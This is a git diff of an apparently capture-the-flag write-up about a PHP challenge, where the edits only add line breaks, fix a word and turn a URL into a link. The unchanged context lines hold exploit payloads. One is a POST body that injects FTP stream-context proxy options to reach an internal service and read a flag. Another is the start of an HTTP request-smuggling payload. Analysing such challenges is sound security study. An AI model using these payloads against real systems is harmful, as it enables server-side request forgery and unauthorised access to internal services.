@@ -888,7 +888,7 @@ if(isset($_POST['hello']))
 ?>
 ```
 
-Let's dive into the code analysis.
+Let's dive into the code analysis. <br>
 **1. About input handling and filtering:**
 ```php
 $protocol = (isset($_SESSION['protocol']) && !preg_match('/http|file/i', $_SESSION['protocol'])) ? $_SESSION['protocol'] : null;
@@ -927,7 +927,7 @@ password: admin
 username=admin&hello=a&protocol=ftp://a/flag?&options={"ftp":{"proxy":"tcp://web:5000"}}
 ```
 
-Let's explain details:
+Let's explain details: <br>
 **1. For the request smuggling part:**
 ```
 aaa HTTP/1.1
@@ -956,8 +956,8 @@ protocol=ftp://a/flag?
 ```
 - Injects proxy settings to redirect requests to internal web service.
 
-To know why we use thus stream options is that: <br>
-From this article: https://www.php.net/manual/en/context.ftp.php <br>
+To know why we use this stream options is that: <br>
+From this [FTP context options](https://www.php.net/manual/en/context.ftp.php) article <br>
 There is a statement that says:
 ```
 FTP context options:
